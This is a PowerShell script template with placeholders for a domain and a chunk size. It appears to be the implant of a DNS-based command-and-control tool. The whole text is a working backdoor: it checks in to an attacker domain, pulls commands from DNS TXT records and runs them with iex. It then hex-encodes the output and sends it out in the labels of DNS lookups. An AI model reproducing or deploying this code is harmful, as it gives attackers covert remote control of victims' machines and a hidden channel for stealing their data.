$url="{{.Domain}}";$uidr=Get-Random;$uid=$uidr.toString()+"";function execDNS{Param([parameter(position=0)]$cmd,[parameter(position=1)]$cmdid)$cmd=[system.String]$cmd;$c=(iex $cmd)2>&1|Out-String;$string=($c|Format-Hex|Select-Object -Expand Bytes|ForEach-Object{'{0:x2}' -f $_}) -join '';$len=$string.Length;$split={{.Split}};$repeat=[Math]::Floor($len/$split);$remainder=$len%$split;$repeatr=$repeat;if($remainder){$repeatr=$repeat+1;};for($i=0;$i -lt $repeat;$i++){$str=$string.Substring($i*$Split,$Split);$durl=$str+"."+($i+1)+"."+$repeatr+"."+$cmdid+"."+$uid+"."+$url;$q=resolve-dnsname -Name $durl -type 1;};if($remainder){$str=$string.Substring($len-$remainder);$durl2=$str+"."+($i+1)+"."+$repeatr+"."+$cmdid+"."+$uid+"."+$url;$q=resolve-dnsname -type 1 $durl2;};};while(1){$checkin=$uid+"."+$url;$q=resolve-dnsname -type 1 -Name $checkin;$c=Get-Random;$cs=$c.ToString();Start-Sleep -s 5;$u=$cs+"."+$uid+"."+$url;$txt=resolve-dnsname -type 16 -dnsonly $u|select-object Strings|%{$_.Strings}|Out-String;$txt=$txt-replace"`n|`r";if($txt -match'NoCMD'){continue}elseif($txt -match'exit'){Exit}else{execDNS -cmd $txt -cmdid $cs};};